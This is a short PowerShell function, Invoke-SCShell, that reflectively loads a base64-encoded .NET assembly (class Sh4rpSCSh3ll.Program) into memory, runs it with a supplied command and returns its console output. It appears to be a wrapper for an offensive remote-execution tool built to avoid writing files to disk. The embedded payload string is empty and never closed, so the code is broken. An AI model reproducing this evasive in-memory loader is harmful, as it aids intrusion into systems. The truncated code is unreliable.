function Invoke-SCShell
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = ""

    )

    $base64binary="
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [Sh4rpSCSh3ll.Program]::main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
  
}